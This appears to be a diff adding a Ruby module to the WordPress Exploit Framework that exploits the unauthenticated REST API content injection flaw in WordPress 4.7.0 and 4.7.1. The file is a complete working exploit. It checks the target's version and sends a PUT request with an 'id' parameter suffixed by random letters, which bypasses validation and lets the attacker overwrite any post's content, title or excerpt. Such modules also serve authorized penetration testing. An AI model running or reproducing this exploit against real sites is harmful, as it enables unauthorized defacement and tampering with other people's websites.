@@ -1,0 +1,105 @@
+class Wpxf::Auxiliary::WpV471ContentInjection < Wpxf::Module
+  include Wpxf
+
+  def initialize
+    super
+
+    update_info(
+      name: 'WordPress 4.7.0 - 4.7.1 Unauthenticated Content Injection',
+      desc: %(
+        The REST API in versions 4.7.0 and 4.7.1 of WordPress contain a number
+        of validation issues, which allow unauthenticated users to edit any post
+        on the target installation.
+
+        If the target has the API enabled (enabled by default), this module will
+        update the post with the specified content, title and or excerpt.
+      ),
+      author: [
+        'Sucuri <sucuri.net>',            # Disclosure
+        'Rob Carr <rob[at]rastating.com>' # WPXF module
+      ],
+      references: [
+        ['WPVDB', '8734'],
+        ['URL', 'https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html']
+      ],
+      date: 'Feb 01 2017'
+    )
+
+    register_options([
+      IntegerOption.new(
+        name: 'post_id',
+        desc: 'The ID of the post to update',
+        required: true
+      ),
+      StringOption.new(
+        name: 'content',
+        desc: 'The content to inject',
+        required: false
+      ),
+      StringOption.new(
+        name: 'title',
+        desc: 'The title to inject',
+        required: false
+      ),
+      StringOption.new(
+        name: 'excerpt',
+        desc: 'The excerpt to inject',
+        required: false
+      )
+    ])
+  end
+
+  def check
+    version = wordpress_version
+    return :unknown if version.nil?
+
+    if version == Gem::Version.new('4.7') || version == Gem::Version.new('4.7.1')
+      return :vulnerable if rest_api_is_available
+    end
+
+    :safe
+  end
+
+  def rest_api_is_available
+    res = execute_get_request(url: wordpress_url_rest_api)
+    (res && res.code == 200)
+  end
+
+  def post_id
+    normalized_option_value('post_id')
+  end
+
+  def post_route
+    normalize_uri(wordpress_url_rest_api, 'wp', 'v2', 'posts', post_id)
+  end
+
+  def api_request_body
+    data = {}
+    data['content'] = datastore['content'] if datastore['content']
+    data['title'] = datastore['title'] if datastore['title']
+    data['excerpt'] = datastore['excerpt'] if datastore['excerpt']
+    data
+  end
+
+  def run
+    return false unless super
+
+    emit_info 'Building request...'
+    data = api_request_body
+    emit_info "Request: #{data.inspect}", true
+
+    emit_info 'Injecting content...'
+    execute_put_request(
+      url: post_route,
+      body: data.to_json,
+      params: {
+        'id' => "#{post_id}#{Utility::Text.rand_alpha(3)}"
+      },
+      headers: {
+        'Content-Type' => 'application/json'
+      }
+    )
+
+    true
+  end
+end
